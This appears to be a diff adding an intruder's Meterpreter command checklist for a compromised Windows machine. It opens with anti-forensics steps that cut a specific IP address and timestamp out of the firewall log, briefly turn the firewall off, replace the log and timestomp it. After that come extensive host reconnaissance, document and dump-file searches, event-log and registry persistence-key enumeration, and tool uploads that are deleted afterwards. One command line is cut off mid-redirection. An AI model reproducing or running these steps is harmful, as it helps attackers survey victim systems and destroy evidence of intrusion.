@@ -1,0 +1,88 @@
+WinFW
+run multicommand -cl 'netsh advfirewall show currentprofile'
+run multicommand -cl 'cmd /c findstr /v "192.0.2.80" c:\windows\system32\logfiles\firewall\pfirewall.log > outfile'
+run multicommand -cl 'cmd /c findstr /v /c:"2018-11-29 14:11:05 ALLOW TCP" pfirewall.log > 
+run multicommand -cl 'cmd /c type outfile | find /c /v ""'   
+run multicommand -cl 'cmd /c more outfile +15916'
+idletime
+run multicommand -cl 'netsh advfirewall set currentprofile state off'
+run multicommand -cl 'cmd /c move outfile c:\windows\system32\logfiles\firewall\pfirewall.log'
+timestomp -m "MM/DD/YYYY HH:MM:SS" c:\windows\system32\logfiles\firewall\pfirewall.log
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+localtime
+ipconfig
+sysinfo
+getuid
+getpid
+pwd
+netstat
+ps
+run multicommand -cl 'cmd /c systeminfo'
+run post/windows/gather/wmic_command COMMAND="computersystem get TotalPhysicalMemory"
+run post/windows/gather/wmic_command COMMAND="OS get FreePhysicalMemory"
+run multicommand -cl 'netsh interface ip show config'
+route
+run post/windows/gather/enum_applications
+run post/windows/gather/enum_logged_on_users
+run post/multi/gather/env
+run post/windows/gather/enum_shares
+run post/windows/gather/enum_services
+idletime
+run getcountermeasure
+show_mount
+run post/windows/gather/wmic_command COMMAND="startup list"
+run multicommand -cl "net users","net accounts","net share","net localgroup administrators"
+run multicommand -cl 'schtasks /query'
+search -r -d C:\\ -f *.doc -f *.pptx -f *.pdf
+run multicommand -cl 'cmd /c dir c:\*.log /S /A /od /tw'
+search -r -d C:\\ -f *.wer -f *.dmp
+run multicommand -cl 'cmd /c dir c:\*.*dmp /S /A /od /tw'
+run multicommand -cl 'cmd /c dir c:\*.*wer /S /A /od /tw'
+run event_manager -i 
+run event_manager -l application
+run event_manager -l security
+run event_manager -l system 
+run event_manager -l powershell 
+run multicommand -cl 'netsh firewall show logging'
+upload /root/auditpol_xp.exe C:\\temp\\auditpol_xp.exe 
+run multicommand -cl 'auditpol_XP.exe'
+rm C:\\temp\\auditpol_xp.exe 
+run multicommand -cl 'auditpol /get /category:*'
+run multicommand -cl 'netsh advfirewall show currentprofile'
+dir C:\\Windows\\prefetch
+run multicommand -cl 'powershell /c get-mpcomputerstatus'
+
+reg enumkey -k 'HKLM\software\microsoft\powershell\1\powershellengine'
+reg queryval -k 'HKLM\software\microsoft\powershell\1\powershellengine' -v "powershellversion"
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\run'
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\runonce'
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion'
+reg enumkey -k 'HKCU\software\microsoft\windows\currentversion\run'
+reg enumkey -k 'HKCU\software\microsoft\windows\currentversion\runonce'
+reg enumkey -k 'HKCU\software\microsoft\windows\currentversion'
+reg enumkey -k 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'
+reg queryval -k 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -v common startup
+reg enumkey -k 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'
+reg enumkey -k 'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'
+reg enumkey -k 'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\policies\explorer\run'
+reg enumkey -k 'HKCU\software\microsoft\windows\currentversion\policies\explorer\run'
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\runservices'
+reg enumkey -k 'HKCU\software\microsoft\windows\currentversion\runservices'
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\runservicesonce'
+reg enumkey -k 'HKCU\software\microsoft\windows\currentversion\runservicesonce'
+reg enumkey -k 'HKLM\software\microsoft\windows nt\currentversion\winlogon\userinit'
+reg enumkey -k 'HKLM\software\microsoft\windows nt\currentversion\winlogon\shell'
+reg enumkey -k 'HKCU\software\microsoft\windows\currentversion\windows'
+reg enumkey -k 'HKLM\system\currentcontrolset\control\session manager'
+reg queryval -k 'HKLM\system\currentcontrolset\control\session manager' -v bootexecute
+reg enumkey -k 'HKLM\Software\wow6432node'
+reg enumkey -k 'HKLM\software\microsoft\windows nt\currentversion\profilelist'
+
+upload "/root/psloglist.exe" 'C:\windows\temp\psloglist.exe'
+run multicommand -cl 'psloglist.exe -m 15 SECURITY /accepteula'
+run multicommand -cl 'psloglist.exe -m 15 SYSYEM /accepteula'
+run multicommand -cl 'psloglist.exe -m 15 APPLICATION /accepteula'
+run multicommand -cl 'psloglist.exe -o \"Microsoft Antimalware\"'
+rm psloglist.exe 
